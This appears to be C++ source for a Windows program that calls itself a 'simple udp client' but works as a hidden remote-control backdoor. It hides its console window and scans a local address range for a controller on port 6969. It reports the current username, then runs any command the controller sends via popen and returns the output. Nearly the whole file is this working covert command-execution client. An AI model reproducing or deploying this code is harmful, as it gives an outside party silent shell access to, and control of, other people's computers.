/*
	Simple udp client
*/
//#include <stdio.h>
#include <stdexcept>
#include <stdio.h>
#include <string>
#include <vector>

#include <winsock2.h>
#include <windows.h>

//#pragma comment(lib,"ws2_32.lib") //Winsock Library

#define BUFLEN 4096	//Max length of buffer
#define PORT 6969	//The port on which to listen for incoming data

#include "host_finder.hpp"
#include "color_codes.hpp"

std::string hostIP = "";

HostFinder hostFinder;

// Macros
std::string exec(std::string command);
std::string getUsername();
std::vector<std::string> split(std::string input, std::string delimiter, int splits=-1);
void force_ACK();

struct sockaddr_in si_other;
int s, slen=sizeof(si_other);
char buf[BUFLEN];
char message[BUFLEN];

int main()
{
	FreeConsole();
no_host:
	hostIP = "";
	while (hostIP.length() < 11) { // minimum is xxx.xxx.x.x which is 11 chars
		hostIP = hostFinder.find(PORT, 50, 190, 10, 0);
	}

	WSADATA wsa;

	//Initialise winsock
//	printf("\nInitialising Winsock...");
	if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
	{
		printf("Failed. Error Code : %d",WSAGetLastError());
		exit(EXIT_FAILURE);
	}
//	printf("Initialised.\n");

	//create socket
	if ( (s=socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
	{
//		printf("socket() failed with error code : %d" , WSAGetLastError());
//		exit(EXIT_FAILURE);
		goto no_host;
	}

	int ReceiveTimeout = 500;
	setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&ReceiveTimeout, sizeof(int));
	setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&ReceiveTimeout, sizeof(int));

	//setup address structure
	memset((char *) &si_other, 0, sizeof(si_other));
	si_other.sin_family = AF_INET;
	si_other.sin_port = htons(PORT);
	si_other.sin_addr.S_un.S_addr = inet_addr(hostIP.c_str());

	strcpy(message, "HELLO ");
	strncpy(&message[0] + 6, getUsername().c_str(), BUFLEN-6);

replay_hello:
	sendto(s, message, strlen(message), 0, (struct sockaddr *) &si_other, slen);
	memset(buf, '\0', BUFLEN);
	recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *) &si_other, &slen);
	if (strcmp(buf, "ACK:HELLO") != 0)
		goto replay_hello;

	//start communication
	while(1)
	{
		//send PING message
		strcpy(message, "PING");
		if (sendto(s, message, strlen(message) , 0 , (struct sockaddr *) &si_other, slen) == SOCKET_ERROR)
		{
//			printf("sendto() failed with error code : %d" , WSAGetLastError());

			closesocket(s);
			WSACleanup();

			goto no_host;

			//exit(EXIT_FAILURE);
		}

		//receive a reply and print it
		//clear the buffer by filling null, it might have previously received data
		memset(buf,'\0', BUFLEN);
		//try to receive some data, this is a blocking call
		if (recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *) &si_other, &slen) == SOCKET_ERROR)
		{
//			printf("recvfrom() failed with error code : %d" , WSAGetLastError());

			closesocket(s);
			WSACleanup();

			goto no_host;

			//exit(EXIT_FAILURE);
		} else {
			if (strcmp(buf, "ACK") != 0) {
				std::vector<std::string> command = split(buf, " ", 1);

				if (strcmp(command[0].c_str(), "cmd") == 0) {
					strcpy(message, "REPLY ");
					strncpy(&message[6], exec(command[1]).c_str(), BUFLEN-6);
					force_ACK();
				} else if (strcmp(command[0].c_str(), "shutdown") == 0)
					break;
			}
		}
	}

	closesocket(s);
	WSACleanup();

	return 0;
}

// make sure command that need response ACK is being sent
void force_ACK() {
replay_forceACK:
	sendto(s, message, strlen(message), 0, (struct sockaddr *) &si_other, slen);
	memset(buf, '\0', BUFLEN);
	recvfrom(s, buf, BUFLEN, 0, (struct sockaddr *) &si_other, &slen);
	if (strcmp(buf, "ACK") != 0)
		goto replay_forceACK;
}

std::vector<std::string> split(std::string input, std::string delimiter, int splits) {
	std::vector<std::string> output;
	size_t pos = 0;
	int i = 0;
	while ((pos = input.find(delimiter)) != std::string::npos && i != splits) {
		output.push_back(input.substr(0, pos));
		input.erase(0, pos + delimiter.length());
		i++;
	}
	// add the rest of the string to last element
	output.push_back(input);
	return output;
}

#define INFO_BUFFER_SIZE 32767
TCHAR infoBuf[INFO_BUFFER_SIZE];
DWORD bufCharCount = INFO_BUFFER_SIZE;

std::string getUsername() {

	// Get and display the user name.
	if( !GetUserName( infoBuf, &bufCharCount ) )
		strcpy(infoBuf, "Unknown");
	return infoBuf;
}

std::string exec(std::string command) {
	char buffer[BUFLEN - 50]; // add some space for other stuff like command etc
	std::string result = "";

	// Open pipe to file
	FILE* pipe = popen(command.c_str(), "r");
	if (!pipe) {
		return "popen failed!";
	}

	// read till end of process:
	while (!feof(pipe)) {

	// use buffer to read and add to result
	if (fgets(buffer, BUFLEN - 50, pipe) != NULL)
		result += buffer;
	}

	auto rc = pclose(pipe);

	if (rc == EXIT_SUCCESS) { // == 0
		// do nothing here
	} else if (rc == EXIT_FAILURE) {  // EXIT_FAILURE is not used by all programs, maybe needs some adaptation.
		result += "EXIT_FAILURE\nAdd 2>&1 to the end of the command to get the error";
	} else
		result += "UNKNOWN_FAILURE\nAdd 2>&1 to the end of the command to get the error";
	return result;
}
